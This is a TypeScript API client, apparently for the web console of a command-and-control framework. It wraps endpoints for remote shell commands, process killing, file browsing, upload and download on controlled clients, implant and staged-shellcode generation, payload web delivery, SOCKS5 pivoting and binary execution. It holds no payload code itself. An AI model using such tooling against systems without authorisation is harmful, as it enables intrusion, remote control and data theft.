import request from '@/utils/request'
import type {LocationQueryValue} from "vue-router";
import type {UnwrapRef} from "vue";

import pinia from '@/stores/index';
// import {useAxiosConfigStore} from '@/stores/server';
// const axiosConfig = useAxiosConfigStore(pinia);

export default{
    get_clients_list(data: { page: number; page_size: number}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/clientslist",
            method: 'get',
            params: data,
        })
    },
    // 向后端发送命令请求
    send_commands(data: { uid: string | LocationQueryValue[], command: string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/shell/sendcommand",
            method:'post',
            data:data
        })
    },
    get_shellcontent(data:{uid: string | LocationQueryValue[]}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/shell/getshellcontent",
            method: "get",
            params:data,
        })
    },
    get_pid_list(data: { uid: string | null | LocationQueryValue[] }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/pid",
            method:"get",
            params:data,
        })
    },
    kill_pid(data: { uid: string | null | LocationQueryValue[]; pid: string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/pid/kill",
            method:"post",
            data:data,
        })
    },
    get_file_tree(data: { uid: string | LocationQueryValue[], dirPath:string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/tree",
            method:"post",
            data:data,
        })
    },
    delete_file(data: { uid: string | LocationQueryValue[], filePath: string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/delete",
            method:"post",
            data:data,
        })
    },
    make_dir(data: { uid: string | LocationQueryValue[], dirPath: string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/mkdir",
            method:"post",
            data:data,
        })
    },
    upload_file(data: { uid: string | LocationQueryValue[]; file: File; uploadPath: string }){
        const formData = new FormData();

        // 添加文件和其他数据到 FormData 中
        formData.append("file", data.file);
        formData.append("uid", data.uid as string); // 转换为字符串以确保正确传递
        formData.append("uploadPath", data.uploadPath as string); // 新增的参数

        return request({
      //      baseURL: axiosConfig.baseURL,
            url: "/client/file/upload",
            method: "post",
            headers: {
                "Content-Type": "multipart/form-data"
            },
            data: formData,
        });
    },
    get_note(data: { uid: string | LocationQueryValue[] }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/note/get",
            method:"get",
            params:data,
        })
    },
    save_note(data: { uid: string | LocationQueryValue[], noteContent: UnwrapRef<string> }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/note/save",
            method:"post",
            data:data,
        })
    },
    download_file(data: { uid: string | LocationQueryValue[], filePath:string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/download",
            method:"post",
            data:data,
        })
    },
    download_downloaded_file(data: { uid: string | null | LocationQueryValue[]; filePath: string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/downloads/downloaded_file",
            method:"post",
            responseType: 'blob',
            data:data
        })
    },
    get_downloads_info(data: { uid: string | null | LocationQueryValue[] }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/downloads/info",
            method:"get",
            params:data
        })
    },
    get_drives(data:{uid:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/drives",
            method:"get",
            params:data
        })
    },
    fetch_file_content(data:{uid:string,path:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/file/filecontent",
            method:"POST",
            data:data
        })
    },
    do_exit(data:{uid:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/exit",
            method:"GET",
            params:data,
        })
    },
    add_uid_note(data:{uid:string,note:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/addnote",
            method:"POST",
            data:data
        })
    },
    edit_sleep(data:{uid:string,sleep:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/sleep",
            method:"post",
            data:data,
        })
    },
    select_color(data:{uid:string,color:string}){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/color",
            method:"post",
            data:data,
        })
    },
    GenServer(data: { osType:string,archType:string,listener:string,pass:string }){
        return request({
      //      baseURL: axiosConfig.baseURL,
            url:"/client/GenServer",
            method:"post",
            responseType: 'blob',
            data:data
        })
    },
    ShowListener(){
        return request({
            url:"/client/listener/list",
            method:"GET"
        })
    },
    GetWebDeliveryList(){
      return request({
          url:"/webdelivery/list",
          method:"GET"
      })
    },
    StartWebDelivery(data:{listener:string,os:string,arch:string,port:string,filename:string,pass:string}){
        return request({
            url:"/webdelivery/start",
            method:"POST",
            data:data
        })
    },
    OpenWebDelivery(data:{port:string}){
        return request({
            url:"/webdelivery/open",
            method:"POST",
            data:data
        })
    },
    CloseWebDelivery(data:{port:string}){
        return request({
            url:"/webdelivery/close",
            method:"POST",
            data:data
        })
    },
    DeleteWebDelivery(data:{port:string}){
        return request({
            url:"/webdelivery/delete",
            method:"POST",
            data:data
        })
    },
    getSocks5List(data: { uid: string | null | LocationQueryValue[] }){
        return request({
            url:"/socks5/list",
            method:"GET",
            params: data
        })
    },
    startSocks5(data: {
        Socks5port: string;
        uid: string | null | LocationQueryValue[];
        UserName: string;
        Password: string
    }){
        return request({
            url:"/socks5/start",
            method:"POST",
            data:data
        })

    },
    OpenSocks5(data:{Socks5port: string;
        uid: string | null | LocationQueryValue[];
        UserName: string;
        Password: string}){
        return request({
            url:"/socks5/open",
            method:"POST",
            data:data
        })
    },
    CloseSocks5(data:{Socks5port: string;
        uid: string | null | LocationQueryValue[];
        UserName: string;
        Password: string}){
        return request({
            url:"/socks5/close",
            method:"POST",
            data:data
        })
    },
    DeleteSocks5(data:{Socks5port: string;
        uid: string | null | LocationQueryValue[];
        UserName: string;
        Password: string}){
        return request({
            url:"/socks5/delete",
            method:"POST",
            data:data
        })
    },
    ExecuteBin(data:{
        uid: string;
        mode: string;
        file: File;
        args: string;

    }){
        const formData = new FormData();

        // 添加文件和其他数据到 FormData 中
        formData.append("file", data.file);
        formData.append("uid", data.uid as string); // 转换为字符串以确保正确传递
        formData.append("args", data.args as string); // 新增的参数
        formData.append("mode", data.mode as string);

        return request({
            //      baseURL: axiosConfig.baseURL,
            url: "/bin/execute",
            method: "post",
            headers: {
                "Content-Type": "multipart/form-data"
            },
            data: formData,
        });
    },
    // StageLessShellCodeGen(data:{listener:string,arch:string,format:string}){
    //     return request({
    //         url:"/shellcode/stageless",
    //         method:"POST",
    //         data:data,
    //         responseType: 'blob',
    //     })
    //
    // },
    StageShellCodeGen(data:{listener:string,port:string,format:string}){
        return request({
            url:"/shellcode/stage",
            method:"POST",
            data:data,
            responseType: 'blob',
        })

    }

}